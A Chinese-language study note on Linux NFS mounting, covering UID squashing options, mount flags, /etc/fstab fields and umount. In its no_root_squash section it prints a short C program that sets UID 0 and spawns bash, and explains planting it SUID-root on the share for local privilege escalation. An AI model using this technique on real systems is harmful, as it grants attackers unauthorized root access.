零 基本概念
（一）挂载的概念：我们说将A机器上的AA目录挂载到本地B机器上的B目录，B机器的用户可以通过访问BB目录访问到AA目录。
在上例中，我们称AA目录为导出目录，BB目录为挂载目录或称挂载点。



（二）下载安装nfs客户端：sudo apt install nfs-common
虽然Linux自带mount命令，但是往往和现今的nfs版本不匹配，所以最好是下这个nfs-common



（三）这里要强调：你放一个socket监听程序上去，谁运行，在谁的主机上监听，要明确nfs的概念啊。



（四）关键理解：
0 问题：任何挂载某个导出目录的用户都能访问该导出目录，那么问题来了，本地用户怎么看其他主机上的用户创建的文件？（或者说文件的属主和主组如何映射到本地？）

1 答案：
（1）root_squash（默认）：
root -> nobody
common -> common：这是什么意思？比如用户A创建了一个文件，搁A这ll，属主和主组肯定是A啊，但是搁B那ll就是B了。
（2）no_root_squash（提权漏洞）：
root -> root：这就有问题了，黑客可以挂载到共享目录上，放一个.c：
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
int main() {
	setuid(0);
	system("/bin/bash");
	return 0;
}
生成的elf，并将改elf设置为root权限和SUID权限，这样，在黑客拿下这台NAS后，运行该elf即可完成lpe。
common -> common
（3）all_squash：
所有用户 -> nobody







一 mount
（零）形式：mount [OPTION]... [nfs-server-ip-addr:export-dir-path] [MOUNTPOINT]



（一）常用选项
1 -t fstype:
（1）功能：指定要挂载的文件系统类型。
（2）fstype：ext4、nfs、vfat等。

2 -o options:
（1）功能：指定挂载选项，可以是多个，使用逗号分隔。
（2）常见options包括：
rw: 以读写方式挂载。
ro: 以只读方式挂载。
async: 异步写入。
sync: 同步写入。
user: 允许普通用户挂载。
noexec: 不允许在该文件系统上执行任何二进制文件。
auto：在启动时自动挂载。
noauto：不自动挂载。
nosuid: 不允许设置SUID或SGID位。
remount: 重新挂载已挂载的文件系统。
注意：你应该已经发现了有些命令用在命令行会比较奇怪，是的，
user、auto、noauto只能在/etc/fstab（后续会讲）中使用。
（3）-a:
挂载/etc/fstab中定义的所有文件系统。
（4）-r:
以只读方式挂载。
（5）-w:
以读写方式挂载（默认行为）。
（6）-v:
显示详细信息，增加输出的详细程度。
（7）-f:
强制挂载，即使有错误也继续。
（8）--bind:
绑定挂载，将一个现有的目录重新挂载到另一个目录。相当于复制。
（9）--move:
移动一个已挂载的文件系统到新的挂载点。相当于剪切。
测试结果：moving a mount residing under a shared mount is unsupported
（10）权限选项（3个），详见关键理解。



（二）/etc/fstype
0 基本语法：<文件系统>  <挂载点>  <类型>  <选项>  <转储>  <检查>

1 详解：
（1）文件系统:
可以是设备名称（如 /dev/sda1）、UUID（如 UUID=xxxx-xxxx）、LABEL（如 LABEL=mydisk）或网络地址（如 NFS 的 192.168.1.100:/share）。
（2）挂载点:
指定该文件系统将被挂载到的目录路径，如 /mnt/nfs_share。
（3）类型:
文件系统的类型，例如 ext4、nfs、vfat 等。
（4）选项 :
挂载选项，可以有多个，用逗号分隔。例如：
defaults: 默认选项
noauto: 不自动挂载
user: 允许普通用户挂载
rw: 可读可写
ro: 只读
bind: 绑定挂载
其他如 async, sync, noexec, nosuid 等
（5）转储 （备份导出目录）:
一个整数值，表示是否需要备份，0 表示不备份，1 表示需要备份。
（6）检查（就是fsck） :
一个整数值，系统启动时用于检查文件系统的顺序，0 表示不检查，1 表示根文件系统，2 表示其他文件系统。







二 umount
0 功能：用来卸载。如果不umount，你是删不了挂载目录的，必须先卸载。

1 形式：
umount /mnt/mydrive == umount -l /mnt/mydrive：懒惰删除，不好用。
umount -f /mnt/mydrive：强制删除，这个好用